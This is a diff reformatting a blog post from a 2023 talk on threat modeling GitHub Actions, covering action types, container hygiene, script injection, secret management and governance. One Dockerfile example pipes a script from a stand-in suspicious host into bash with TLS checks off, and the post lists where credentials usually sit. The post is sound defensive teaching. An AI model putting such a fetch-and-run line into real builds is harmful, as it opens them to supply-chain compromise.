@@ -7,8 +7,6 @@ tags:
   - security
   - github-actions
 classes: wide
-# toc: true
-# toc_sticky: true
 mermaid: true
 excerpt: "Understand and secure the most critical part of your software supply chain - where you build and ship your code! (from BSides Boulder 2023)"
 ---
@@ -17,8 +15,8 @@ GitHub Actions is phenomenally popular in both open-source and enterprise develo
 
 This talk gives a quick overview of what threat modeling is and why it's important before diving into what an Action _really_ is under the covers, how to handle secrets within it, and some key decisions that'll change your model based on real-world experience.
 
-This post is images, expanded commentary, and resources from a talk I gave at [BSides Boulder 2023](https://bsidesboulder.org/2023/talks/) on June 23rd, 2023 on Threat Modeling GitHub Actions ([slides](https://github.com/some-natalie/some-natalie/raw/main/assets/slides/2023-06-23_Bsides-Boulder-Threat-Modeling-Actions.pdf) as presented).  Since there's no screen-sharing on a website, I can't bounce back and forth between code and a browser and this talk like I could in real life.  There's lots more code snippets, links, and screenshots here than in the original deck to make up for that. :sparkling_heart:
-{: .notice--info}
+> This post is images, expanded commentary, and resources from a talk I gave at [BSides Boulder 2023](https://bsidesboulder.org/2023/talks/) on June 23rd, 2023 on Threat Modeling GitHub Actions ([slides](https://github.com/some-natalie/some-natalie/raw/main/assets/slides/2023-06-23_Bsides-Boulder-Threat-Modeling-Actions.pdf) as presented).  Since there's no screen-sharing on a website, I can't bounce back and forth between code and a browser and this talk like I could in real life.  There's lots more code snippets, links, and screenshots here than in the original deck to make up for that. 💖
+{: .prompt-info}
 
 ## 🗺️ Where we're going
 
@@ -26,7 +24,7 @@ This post is images, expanded commentary, and resources from a talk I gave at [B
 1. [What's a GitHub Action](#whats-an-action) - dig deep into what a GitHub Action is
 1. [Secrets are hard](#managing-secrets) - public service announcement about managing credentials safely in CI
 1. [To self-host or not](#rolling-your-own-changes-a-lot) - how this model changes when you're running this yourself
-1. [Governing the ungovernable](#governing-the-ungovernable) - expanding this model to the enterprise, with tons of people and processes and stakeholders, without quitting your job to become a goat farmer[^1] :goat:
+1. [Governing the ungovernable](#governing-the-ungovernable) - expanding this model to the enterprise, with tons of people and processes and stakeholders, without quitting your job to become a goat farmer[^1] 🐐
 
 ## Introduction
 
@@ -48,12 +46,12 @@ As our systems have scaled, configuration is code, infrastructure is code, manag
 - Scan it
 - Deploy it
 - Create and scale the infrastructure for it
-- and more, I'm sure ... maybe AI will fix it :robot:
+- and more, I'm sure ... maybe AI will fix it 🤖
 
 It's also gotten [OWASP's](https://owasp.org) attention with a brand new [Top 10 for CI/CD](https://owasp.org/www-project-top-10-ci-cd-security-risks/).  (We'll hit on most of these today too.)
 
-No throwing stones in this glass house ...  I've taken down a couple thousand users in production with the wrong line endings in a configuration file.  It had some Windows line endings (`\r\n`) instead of Unix line endings (`\n`).  I didn't see that, the tests all passed so it was merged, then [SaltStack](https://docs.saltproject.io/en/latest/contents.html) did exactly what I told it to do - applied it and restarted services that never came back up.  This could have been prevented by having automated checks, or someone more experienced reviewing my config files, or creating a better deployment model, or ... lots of things.  It's easy to call this a mistake, but a malicious actor could have done this too.  Systems fail in many ways.
-{: .notice--info}
+> No throwing stones in this glass house ...  I've taken down a couple thousand users in production with the wrong line endings in a configuration file.  It had some Windows line endings (`\r\n`) instead of Unix line endings (`\n`).  I didn't see that, the tests all passed so it was merged, then [SaltStack](https://docs.saltproject.io/en/latest/contents.html) did exactly what I told it to do - applied it and restarted services that never came back up.  This could have been prevented by having automated checks, or someone more experienced reviewing my config files, or creating a better deployment model, or ... lots of things.  It's easy to call this a mistake, but a malicious actor could have done this too.  Systems fail in many ways.
+{: .prompt-info}
 
 I've got two things we're going to keep coming back to throughout this talk.
 
@@ -63,7 +61,7 @@ I've got two things we're going to keep coming back to throughout this talk.
 
 First, the [four key questions](https://www.threatmodelingmanifesto.org/) of threat modeling.
 
-Well, the first three anyways.  [Meat Loaf](https://en.wikipedia.org/wiki/Meat_Loaf), great sage of love and power ballads, sang that ["I’d do anything for love, but I won’t do that"](https://www.youtube.com/watch?v%253D9X_ViIPA-Gc) - and never answered what **"that"** was.  Same deal here - I can’t answer if we did a good enough job, only you can.  What's "good enough" for a company creating widgets is substantially different than holding state secrets or working with life-sustaining tech.  :smiley:
+Well, the first three anyways.  [Meat Loaf](https://en.wikipedia.org/wiki/Meat_Loaf), great sage of love and power ballads, sang that ["I’d do anything for love, but I won’t do that"](https://www.youtube.com/watch?v%253D9X_ViIPA-Gc) - and never answered what **"that"** was.  Same deal here - I can’t answer if we did a good enough job, only you can.  What's "good enough" for a company creating widgets is substantially different than holding state secrets or working with life-sustaining tech. 😀
 
 You’re not walking out of here with a comprehensive, end-to-end threat model for your most special pipeline, but hopefully you’ll build a starting point for it.  I’ll focus on highlighting things I see folks overlook, my own struggles doing this in a highly regulated environment, and some of the easier wins in this simplistic pipeline.
 
@@ -71,13 +69,13 @@ You’re not walking out of here with a comprehensive, end-to-end threat model f
 
 The next thing we'll keep coming back to is this simplified pipeline of code moving from a developer to production.  It'll ground us as we move from left to right.
 
-<div class="mermaid" style="text-align: center">
+```mermaid
 flowchart LR
     A(fa:fa-laptop-code Developer) --> B(fab:fa-github GitHub\ncode/issues/etc)
     B --> C(fa:fa-server Build)
     C --> D(fa:fa-server Deploy)
     D --> E(fa:fa-user Environment)
-</div>
+```
 
 ### Some assumptions
 
@@ -132,7 +130,7 @@ Within GitHub Actions, you checkout a repository with [actions/checkout](https:/
 
 For the most part, Actions run and operate in the part of the pipeline highlighted below.  This is where we'll stay for the rest of the talk.
 
-<div class="mermaid" style="text-align: center">
+```mermaid
 flowchart LR
     A(fa:fa-laptop-code Developer) --> B(fab:fa-github GitHub\ncode/issues/etc)
     B --> C(fa:fa-server Build)
@@ -140,13 +138,14 @@ flowchart LR
     C --> D(fa:fa-server Deploy)
     end
     D --> E(fa:fa-user Environment)
-</div>
+```
 
 🤨 ... so what's the catch?
 
 ![slide-14](/assets/graphics/2023-07-03-threat-modeling/Slide14.jpeg)
 
-> Now we have to treat these reusable pipeline building blocks as code we're bringing in, using the same techniques for other package ecosystems instead of evaluating an off-the-shelf product. :bulb:
+> Now we have to treat these reusable pipeline building blocks as code we're bringing in, using the same techniques for other package ecosystems instead of evaluating an off-the-shelf product. 💡
+{: .prompt-tip}
 
 Under the hood (and ideally invisible to end users), a GitHub Action is one of three things.
 
@@ -182,7 +181,7 @@ Requiring dependencies to be vendored
 - Makes JavaScript Actions portable across hosted and self-hosted compute
 - Means you can’t hide dependencies or _require_ anything of a self-hosted environment
 - Software composition analysis tools (eg, [dependabot](https://docs.github.com/en/code-security/dependabot/dependabot-security-updates/about-dependabot-security-updates)) can see all the things
-- Static analysis tools can also see all the things :mag:
+- Static analysis tools can also see all the things 🕵️‍♀️
 
 Many security tools, including GitHub's, are free for public projects on GitHub.  Since all marketplace-listed Actions have to be public ([docs](https://docs.github.com/en/actions/creating-actions/publishing-actions-in-github-marketplace)), there's lots of easy choices to look at and secure anything you're using.
 
@@ -213,8 +212,8 @@ Here's a similar example of a "pull and run" Action from the marketplace - [acti
 
 Nothing in the `docker run` statement for either container Action can be modified by users.  It will not run a privileged container, but it will mount the docker socket from the host - allowing for easy communication between containers.
 
-:warning: This is a key distinction in safety of containers when using GitHub Actions as a SaaS versus bringing your own compute.  There's a lot of ways to build your own CI system for Actions, as I've outlined before in an [architecture guide for self-hosted runners](https://some-natalie.dev/blog/arch-guide-to-selfhosted-actions/).  Your choices there determine how safe this is.  As a SaaS, your Actions are running on ephemeral virtual machines, eliminating the risk of one container job contaminating another or escaping to infect the host persistently.  That is not inherently true for self-hosted compute.
-{: .notice--warning}
+> This is a key distinction in safety of containers when using GitHub Actions as a SaaS versus bringing your own compute.  There's a lot of ways to build your own CI system for Actions, as I've outlined before in an [architecture guide for self-hosted runners](https://some-natalie.dev/blog/arch-guide-to-selfhosted-actions/).  Your choices there determine how safe this is.  As a SaaS, your Actions are running on ephemeral virtual machines, eliminating the risk of one container job contaminating another or escaping to infect the host persistently.  That is not inherently true for self-hosted compute.
+{: .prompt-warning}
 
 #### Image provenance and container hygiene
 
@@ -226,15 +225,15 @@ RUN curl -k https://not-suspicious.weird-tld/uploader.sh | bash
 USER root
 ```
 
-:information_source: For Actions in the marketplace that are pulling a prebuilt container, the container must also be public.
-{: .notice--info}
+> For Actions in the marketplace that are pulling a prebuilt container, the container must also be public.
+{: .prompt-info}
 
 ![slide-21](/assets/graphics/2023-07-03-threat-modeling/Slide21.jpeg)
 
 I think everyone here has a favorite vulnerability to exploit - from cross-site scripting, SQL injections, to simply fuzzing until something fun happens.  Mine is container escapes.  To understand why this is so weird related to GitHub Actions, let’s talk a tiny bit about what a container is.  It's a linux process with some special guard rails that are built into the kernel controlling what it's allowed to see and do.[^5]  Orchestrators (such as [Kubernetes](https://kubernetes.io/)) manage this workload across a cluster of multiple machines.
 
-🧁 Sprinkling containers on your CI doesn’t make it magically safer or more efficient (but it does build a nice résumé).  If you're not careful, it introduces lots of fun new risks that I've spoken about elsewhere.[^6]
-{: .notice--success}
+> 🧁 Sprinkling containers on your CI doesn’t make it magically safer or more efficient (but it does build a nice résumé).  If you're not careful, it introduces lots of fun new risks that I've spoken about elsewhere.[^6]
+{: .prompt-tip}
 
 Apart from the basics of container hygiene, the runner agent does a lot to improve general safety.  It won't run containers as privileged or allow for arbitrary mounts.  The volume mounts, environment variables passed in, etc., can't be edited by a user.  More risk reduction in this system is also pinned on ephemerality (a brand-new, version-controlled host image on each run) preventing persistence of an escape and strictly limiting the access of what can be seen/done.  This is the case if you're using the GitHub-hosted runners, but not necessarily so if you're bringing your own runners.  
 
@@ -263,7 +262,7 @@ When evaluating these, make sure to also look at the dependencies it's calling. 
 
 ![slide-25](/assets/graphics/2023-07-03-threat-modeling/Slide25.jpeg)
 
-Every system that takes input, processes it in some way, then provides output needs to consider what unexpected inputs will do.  There's an absolutely fantastic walkthrough of executing code through the title of a pull request in [GitHub's documentation](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections).  Go try it out step-by-step, then walk through using intermediate variables and sanitization to mitigate it (we walked through it via screen-share in the in-person talk) - I'll wait. :heart:
+Every system that takes input, processes it in some way, then provides output needs to consider what unexpected inputs will do.  There's an absolutely fantastic walkthrough of executing code through the title of a pull request in [GitHub's documentation](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections).  Go try it out step-by-step, then walk through using intermediate variables and sanitization to mitigate it (we walked through it via screen-share in the in-person talk) - I'll wait. ♥️
 
 ## Availability
 
@@ -286,8 +285,8 @@ There are a few additional availability concerns for self-hosted runners to brin
 - Watch out for caching and ingress/egress costs, doubly so if you're running ephemeral compute on-premises.
 - Thoroughly understand every upstream dependency in your company and when they'll rate-limit you.
 
-In my first attempt at setting up [actions-runner-controller](https://github.com/actions/actions-runner-controller), I rate-limited thousands of developers from Docker Hub for most of a business day.  Each build had to pull an image and at least a couple builds went directly to Docker Hub instead of the internal image registry, so instead of a handful of pulls a day it ballooned to thousands an hour.  I don't recommend scream-testing against services that'll rate-limit you, but I did learn my lesson. :mortar_board:
-{: .notice--info}
+> 📚 In my first attempt at setting up [actions-runner-controller](https://github.com/actions/actions-runner-controller), I rate-limited thousands of developers from Docker Hub for most of a business day.  Each build had to pull an image and at least a couple builds went directly to Docker Hub instead of the internal image registry, so instead of a handful of pulls a day it ballooned to thousands an hour.  I don't recommend scream-testing against services that'll rate-limit you, but I did learn my lesson. 🎓
+{: .prompt-info}
 
 ![slide-27](/assets/graphics/2023-07-03-threat-modeling/Slide27.jpeg)
 
@@ -318,7 +317,7 @@ Everything in the marketplace is a public repository.  There's not much of _hidi
 
 There's also tons of free and/or open-source security tooling available to the developers and maintainers of public repositories in GitHub - basically everything you could ever pay us for is free for public repos.  Tons of other vendors feel the same way.  We're all building on the shared foundation and we all want to make it the best we can.
 
-For the folks that feel the need to bring external dependencies in, that's a completely supported workflow too.  Fork it (or clone/push), do whatever scanning and code analysis you need for the type of Action it is, and bring it in.  We'll talk more about this governance in a little bit. :house_with_garden:
+For the folks that feel the need to bring external dependencies in, that's a completely supported workflow too.  Fork it (or clone/push), do whatever scanning and code analysis you need for the type of Action it is, and bring it in.  We'll talk more about this governance in a little bit. 🏡
 
 ![slide-29](/assets/graphics/2023-07-03-threat-modeling/Slide29.jpeg)
 
@@ -328,7 +327,7 @@ For the folks that feel the need to bring external dependencies in, that's a com
 
 ### Wait, where is this a problem?
 
-<div class="mermaid" style="text-align: center">
+```mermaid
 flowchart LR
     Z(before\ntime) --> A
     subgraph Where secret control can be a problem
@@ -338,7 +337,7 @@ flowchart LR
     D --> E(fa:fa-user Environment)
     end
     E --> F(heat death\nof universe)
-</div>
+```
 
 This is a problem everywhere!
 
@@ -349,11 +348,11 @@ Secrets get into source code repositories all the time and I really wish that wa
 Pre-receive hooks work by running on the server, checking the incoming data before accepting it.  These may get limiting on self-hosted infrastructure with tight constraints and lots of regex matching, as you usually need a bit more hardware to run this in a timely fashion.  In exchange, it’s much easier to enable these at scale.
 
 - For GitHub, use the built-in [secret scanning](https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning) with [push protection](https://docs.github.com/en/enterprise-cloud@latest/code-security/secret-scanning/protecting-pushes-with-secret-scanning).  It runs on the server side, so you don't need to do anything more than turn it on.  It’ll also get non-repo sources, like issue bodies and the like, and surface naughty things in history too.  For public repositories on GitHub.com, this is free.
-- For non-GitHub platforms, consider using [OWASP SEDATED](https://github.com/OWASP/SEDATED) if you can configure pre-receive hooks.  It may require a bit of regular expressions to set up the first time, but it's undramatic once you get it going.  Like everything else you implement yourself, don't forget to update the regex to add new patterns! :dart:
+- For non-GitHub platforms, consider using [OWASP SEDATED](https://github.com/OWASP/SEDATED) if you can configure pre-receive hooks.  It may require a bit of regular expressions to set up the first time, but it's undramatic once you get it going.  Like everything else you implement yourself, don't forget to update the regex to add new patterns! 🎯
 
 Pre-commit hooks run on the endpoints, making it impossible to even create a commit if the script fails.  These only work if they run on every machine, in every environment for every commit.  Of these, consider [git-secrets](https://github.com/awslabs/git-secrets) from AWS Labs.  It's one of the easier hooks to install and configure.
 
-Secrets get stored in all manner of fun places on our build and deployment infrastructure too.  Good places to look include
+Secrets get stored in all manner of fun places on our build and deployment infrastructure too.  Good places to look include:
 
 - Normal user directories for that sort of thing like `~/.ssh`
 - Passwords to private registries or proxies in ecosystem or system config files (eg, `pip.conf`)
@@ -361,7 +360,7 @@ Secrets get stored in all manner of fun places on our build and deployment infra
 - I’m pretty sure everything that uses [`expect`](https://linux.die.net/man/1/expect) has something that shouldn’t be in plain text in plain text.
 - Once we’re in production, I’ve found browse-able paths to JDBC URLs that have usernames and passwords, `.ini` files with private keys, etc.  Lots of this kind of thing should be caught by automated scanners these days.
 
-I think everyone here has a story about this. :smiley:
+I think everyone here has a story about this. 😊
 
 ![slide-32](/assets/graphics/2023-07-03-threat-modeling/Slide32.jpeg)
 
@@ -375,8 +374,8 @@ GitHub has a [built-in secret store](https://docs.github.com/en/actions/security
 
 One proviso - Secrets thinks literally everything you put in it is a string.  It does some magic to redact the value from being printed to logs and such.  That magic can sometimes get countered by random binary bits or structured data formats.  The easy way to address that is use `base64` to encode your binary certificates, YAML k8s credentials, etc., as a string, then decode them for use.
 
-Friendly reminder that base64 encoding isn’t encryption.[^10]
-{: .notice--danger}
+> Friendly reminder that base64 encoding isn’t encryption.[^10]
+{: .prompt-danger}
 
 You can also just as easily plug in your existing secret store.  Here’s some easy integrations to get going:
 
@@ -477,7 +476,7 @@ Specifically, that clever engineer that _never_ disabled TLS certificate verific
 
 Thing is, if it takes ~~millenia~~ months to review and approve something, the chances of someone asking for permission drops quite a lot.  Ironically, it’s the most “mature” organizations that have the reputation for this problem.  This doesn’t have to be the case - leveraging expertise and process _can_ move astonishingly quickly.  Here’s an example of a reasonable process to review requests for a marketplace Action:
 
-<div class="mermaid" style="text-align: center">
+```mermaid
 flowchart TB
     A(fab:fa-github User requests a\nmarketplace GitHub Action) --> B[Ticket Portal]
     B --> C(fa:fa-scale-balanced legal review)
@@ -488,13 +487,15 @@ flowchart TB
     C --> F
     F -->|allowed| G[add to allowlist\nimport to GHES]
     F -->|denied| H[user communication\nexplaining decision]
-</div>
+```
 
 - Infrastructure - Can we run this? Do we have the dependencies, etc.
 - Appsec/infosec - Is this safe? (fork/scan, code review, what you need to look for)
 - Legal - No non-commercial-only or “do no evil” licensing, etc.
 
-:bangbang: Most critical, an SLA of less than 1 week from request to decision.  Preferably faster - it’s holding up the business.
+<div style="text-align:center"><p style="font-size: 20px"><b>
+💸 Most critical, an SLA of less than 1 week from request to decision.  Preferably faster - it’s holding up the business. 💸
+</b></p></div>
 
 ![slide-49](/assets/graphics/2023-07-03-threat-modeling/Slide49.jpeg)
 
@@ -504,7 +505,7 @@ I‘m thrilled developer experience is getting so much time and attention recent
 
 If every company is a software company, developer talent is always needed and expensive.  This also extends to your operations and security folks.  Having 10,000 alerts on CI builds sucks just as much as having 10,000 alerts on VM images as having 10,000 requests in queue for `thing`.  The skills these folks bring are equally in demand.
 
-You can leverage open-source package ecosystems safely - GitHub Actions isn’t a terrifying exception.  It can be safer and faster and reduce the overhead on your security teams as compared to existing CI systems, especially when implemented deliberately.  Hopefully you’ve got the tools to do that now. :ribbon:
+You can leverage open-source package ecosystems safely - GitHub Actions isn’t a terrifying exception.  It can be safer and faster and reduce the overhead on your security teams as compared to existing CI systems, especially when implemented deliberately.  Hopefully you’ve got the tools to do that now. 🎀
 
 ## Resources
 
